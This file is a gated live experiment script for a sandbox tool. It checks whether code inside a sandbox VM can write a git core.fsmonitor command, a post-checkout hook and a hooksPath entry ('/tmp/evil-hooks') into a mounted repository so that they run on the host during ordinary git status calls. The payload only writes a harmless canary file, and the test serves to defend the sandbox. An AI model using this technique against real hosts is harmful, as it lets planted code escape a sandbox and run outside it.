/**
 * GATED live EXPERIMENT (not a pass/fail check): can code in a sandbox plant something in a pool slot that later runs on the HOST?
 * Never part of `npm test`, `npm run check` or CI. No flow daemon is started. Creates ONE sandbox `flow-sbx-live-slot-<random>` (image
 * from SLOT_IMAGE, default flow-sandbox:m6) whose primary read/write mount is a throw-away git clone standing in for a pool slot; from
 * inside the VM the agent edits `<slot>/.git/config` (a harmless `core.fsmonitor` that only writes a canary file in the temp tree) and
 * adds `<slot>/.git/hooks/post-checkout`. Afterwards the HOST looks at the slot and runs the same read-only git commands the daemon
 * runs in a slot (`git rev-parse`, `git status`), then reports whether the canary was written (= code planted from the sandbox ran on
 * the host). Everything is removed in a `finally`. No setting, policy or network rule is touched.
 *
 * Usage: SBX_LIVE=1 node --import tsx packages/flow-sandbox/scripts/live/PoolSlotLiveCheck.mjs
 * Output: JSON on stdout and in .claude/temp/sbx-0-51/poolslot-results.json.
 */
import { spawnSync } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { PathTranslator } from '../../src/PathTranslator.ts';
import { SbxCliRuntime } from '../../src/SbxCliRuntime.ts';

if (process.env.SBX_LIVE !== '1') {
	console.error('PoolSlotLiveCheck refused to run: set SBX_LIVE=1 to confirm that you want to create and remove a real sandbox.');
	process.exit(2);
}
if (process.env.SBX_MOCK_PATH) {
	console.error('PoolSlotLiveCheck refused to run: SBX_MOCK_PATH is set, the result would not be live.');
	process.exit(2);
}

const suffix = randomBytes(3).toString('hex');
const sandbox = `flow-sbx-live-slot-${suffix}`;
const image = process.env.SLOT_IMAGE ?? 'flow-sandbox:m6';
const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `flow-sbx-slot-${suffix}-`)));
const origin = path.join(root, 'origin');
const slot = path.join(root, 'pool', 'slot-1');
const meta = path.join(root, 'meta');
const canary = path.join(root, 'FSMONITOR-RAN.txt');
const report = { sandbox, image, platform: `${process.platform} ${os.release()}` };

function git(args, cwd) {
	const result = spawnSync('git', args, { cwd, encoding: 'utf8', windowsHide: true });
	return { status: result.status, stdout: result.stdout.trim(), stderr: result.stderr.trim() };
}

fs.mkdirSync(origin, { recursive: true });
fs.mkdirSync(meta, { recursive: true });
fs.mkdirSync(path.dirname(slot), { recursive: true });
git(['init', '-q'], origin);
fs.writeFileSync(path.join(origin, 'README.md'), 'origin\n');
git(['-c', 'user.email=t@example.invalid', '-c', 'user.name=t', 'add', '-A'], origin);
git(['-c', 'user.email=t@example.invalid', '-c', 'user.name=t', 'commit', '-q', '-m', 'init'], origin);
git(['clone', '-q', origin, slot], root);
const configBefore = fs.readFileSync(path.join(slot, '.git', 'config'), 'utf8');

const runtime = new SbxCliRuntime();
const translator = new PathTranslator({ workspaceDir: slot, workspaceMetaDir: meta, platform: process.platform });

try {
	console.log(`sandbox ${sandbox}, image ${image}, slot ${slot}`);
	await runtime.create({
		name: sandbox,
		agent: 'shell',
		image,
		pull: 'never',
		mounts: [{ hostPath: slot }, { hostPath: meta }],
		cpus: 2,
		memory: '2g',
	});
	const slotVm = translator.toSandbox(slot, 'slot');
	// The planted fsmonitor is a POSIX shell command that writes the canary; git for Windows runs it through its own sh.
	const canaryPosix = `/${canary[0].toLowerCase()}${canary.slice(2).replaceAll('\\', '/')}`;
	const script = [
		'set +e',
		`cd '${slotVm}'`,
		'echo "git in the VM: $(git --version 2>&1)"',
		`git config core.fsmonitor 'echo planted-by-the-sandbox > "${canaryPosix}"; echo'`,
		'echo "git config exit: $?"',
		'printf "#!/bin/sh\\necho hook-ran >> /dev/null\\n" > .git/hooks/post-checkout && chmod +x .git/hooks/post-checkout',
		'echo "hook written: $?"',
		'git config --list --local | grep -i "fsmonitor\\|hooksPath"',
		'ls -la .git/hooks | grep post-checkout',
		// Not just a feature of git config: a raw write to the file as well.
		'printf "\\n[core]\\n\\thooksPath = /tmp/evil-hooks\\n" >> .git/config; echo "raw append: $?"',
	].join('\n');
	const vm = await runtime.exec({ sandbox, command: ['bash', '-s'], stdin: script });
	report.vmOutput = vm.stdout + vm.stderr;
	report.vmExitCode = vm.exitCode;

	const configAfter = fs.readFileSync(path.join(slot, '.git', 'config'), 'utf8');
	report.hostSeesConfigChange = configAfter !== configBefore;
	report.hostConfigAfter = configAfter;
	report.hostSeesHook = fs.existsSync(path.join(slot, '.git', 'hooks', 'post-checkout'));

	// What the daemon does in a slot (GitFolderProbe: rev-parse, status): read-only commands, but git honors core.fsmonitor.
	report.hostGitRevParse = git(['rev-parse', '--git-dir'], slot);
	report.hostGitStatus = git(['status', '--porcelain'], slot);
	report.canaryWrittenOnHost = fs.existsSync(canary);
	report.canaryContent = report.canaryWrittenOnHost ? fs.readFileSync(canary, 'utf8') : undefined;
	report.verdict = report.canaryWrittenOnHost
		? 'CODE PLANTED FROM THE SANDBOX RAN ON THE HOST (git status honored the core.fsmonitor written by the VM)'
		: report.hostSeesConfigChange
			? 'The VM changed .git/config on the host; the planted fsmonitor did not run on the host in this test (see hostGitStatus)'
			: 'The VM could not change .git/config on the host';
} catch (error) {
	report.error = error instanceof Error ? error.stack : String(error);
	process.exitCode = 1;
} finally {
	try {
		await runtime.remove(sandbox);
		console.log(`cleanup: sandbox ${sandbox} removed`);
	} catch (error) {
		console.error(`CLEANUP FAILED: run "sbx rm --force ${sandbox}" by hand: ${error.message}`);
		process.exitCode = 1;
	}
	const output = path.resolve(import.meta.dirname, '..', '..', '..', '..', '.claude', 'temp', 'sbx-0-51');
	fs.mkdirSync(output, { recursive: true });
	fs.writeFileSync(path.join(output, 'poolslot-results.json'), JSON.stringify(report, null, 2));
	console.log(JSON.stringify(report, null, 2));
	fs.rmSync(root, { recursive: true, force: true });
}
